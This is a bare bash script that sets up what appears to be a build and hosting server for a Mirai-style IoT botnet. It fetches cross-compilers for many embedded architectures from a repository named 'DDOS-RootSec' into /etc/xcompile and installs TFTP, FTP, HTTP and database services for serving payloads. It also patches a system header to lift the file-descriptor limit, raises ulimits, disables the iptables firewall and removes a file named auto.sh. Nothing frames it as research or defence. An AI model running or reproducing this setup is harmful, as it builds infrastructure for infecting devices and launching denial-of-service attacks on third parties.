#!/bin/bash
cd ~/
sudo apt update && sudo apt upgrade -y
apt install software-properties-common -y
apt install build-essential -y
apt install libgmp-dev -y
apt-get install screen wget bzip2 gcc nano g++ electric-fence sudo git libc6-dev apache2 xinetd tftpd-hpa mariadb-server python3 php vsftpd -y

wget https://go.dev/dl/go1.24.2.linux-amd64.tar.gz
sudo rm -rf /usr/local/go
sudo tar -C /usr/local -xzf go1.24.2.linux-amd64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' | sudo tee /etc/profile.d/go.sh
chmod +x /etc/profile.d/go.sh
source /etc/profile.d/go.sh
go version

cd ~/

mkdir /etc/xcompile
cd /etc/xcompile
wget https://github.com/R00tS3c/DDOS-RootSec/raw/refs/heads/master/uclib-cross-compilers/cross-compiler-i586.tar.bz2
wget https://github.com/R00tS3c/DDOS-RootSec/raw/refs/heads/master/uclib-cross-compilers/cross-compiler-i686.tar.bz2
wget https://github.com/R00tS3c/DDOS-RootSec/raw/refs/heads/master/uclib-cross-compilers/cross-compiler-m68k.tar.bz2
wget https://github.com/R00tS3c/DDOS-RootSec/raw/refs/heads/master/uclib-cross-compilers/cross-compiler-mips.tar.bz2
wget https://github.com/R00tS3c/DDOS-RootSec/raw/refs/heads/master/uclib-cross-compilers/cross-compiler-mipsel.tar.bz2
wget https://github.com/R00tS3c/DDOS-RootSec/raw/refs/heads/master/uclib-cross-compilers/cross-compiler-powerpc.tar.bz2
wget https://github.com/R00tS3c/DDOS-RootSec/raw/refs/heads/master/uclib-cross-compilers/cross-compiler-sh4.tar.bz2
wget https://github.com/R00tS3c/DDOS-RootSec/raw/refs/heads/master/uclib-cross-compilers/cross-compiler-sparc.tar.bz2
wget https://github.com/R00tS3c/DDOS-RootSec/raw/refs/heads/master/uclib-cross-compilers/cross-compiler-armv4l.tar.bz2
wget https://github.com/R00tS3c/DDOS-RootSec/raw/refs/heads/master/uclib-cross-compilers/cross-compiler-armv5l.tar.bz2
wget https://github.com/R00tS3c/DDOS-RootSec/raw/refs/heads/master/uclib-cross-compilers/cross-compiler-armv6l.tar.bz2
wget https://github.com/R00tS3c/DDOS-RootSec/raw/refs/heads/master/uclib-cross-compilers/cross-compiler-armv7l.tar.bz2
wget https://github.com/R00tS3c/DDOS-RootSec/raw/refs/heads/master/uclib-cross-compilers/arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install.tar.gz
wget https://github.com/R00tS3c/DDOS-RootSec/raw/refs/heads/master/uclib-cross-compilers/cross-compiler-powerpc-440fp.tar.bz2
wget https://github.com/R00tS3c/DDOS-RootSec/raw/refs/heads/master/uclib-cross-compilers/cross-compiler-x86_64.tar.bz2
wget https://github.com/R00tS3c/DDOS-RootSec/raw/refs/heads/master/uclib-cross-compilers/cross-compiler-i486.tar.gz

tar -jxf cross-compiler-i586.tar.bz2
tar -jxf cross-compiler-m68k.tar.bz2
tar -jxf cross-compiler-mips.tar.bz2
tar -jxf cross-compiler-mipsel.tar.bz2
tar -jxf cross-compiler-powerpc.tar.bz2
tar -jxf cross-compiler-sh4.tar.bz2
tar -jxf cross-compiler-i586.tar.bz2
tar -jxf cross-compiler-i686.tar.bz2
tar -jxf cross-compiler-sparc.tar.bz2
tar -jxf cross-compiler-armv4l.tar.bz2
tar -jxf cross-compiler-armv5l.tar.bz2
tar -jxf cross-compiler-armv6l.tar.bz2
tar -jxf cross-compiler-armv7l.tar.bz2
tar -vxf arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install.tar.gz
tar -jxf cross-compiler-powerpc-440fp.tar.bz2
tar -jxf cross-compiler-x86_64.tar.bz2
tar -xvf cross-compiler-i486.tar.gz

rm -rf *.tar.bz2
rm -rf *.tar.gz
rm -rf *.tar
rm -rf *.tar.xz

mv cross-compiler-i486 i486
mv cross-compiler-i586 i586
mv cross-compiler-i686 i686
mv cross-compiler-m68k m68k
mv cross-compiler-mips mips
mv cross-compiler-mipsel mipsel
mv cross-compiler-powerpc powerpc
mv cross-compiler-sh4 sh4
mv cross-compiler-sparc sparc
mv cross-compiler-armv4l armv4l
mv cross-compiler-armv5l armv5l
mv cross-compiler-armv6l armv6l
mv cross-compiler-armv7l armv7l
mv arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install arc
mv cross-compiler-powerpc-440fp powerpc-440fp
mv cross-compiler-x86_64 x86_64

cd ~/

sudo sed -i 's/1024/999999/g' /usr/include/x86_64-linux-gnu/bits/typesizes.h
ulimit -n999999; ulimit -u999999; ulimit -e999999

service iptables stop 
service apache2 restart
service mariadb restart

rm -rf auto.sh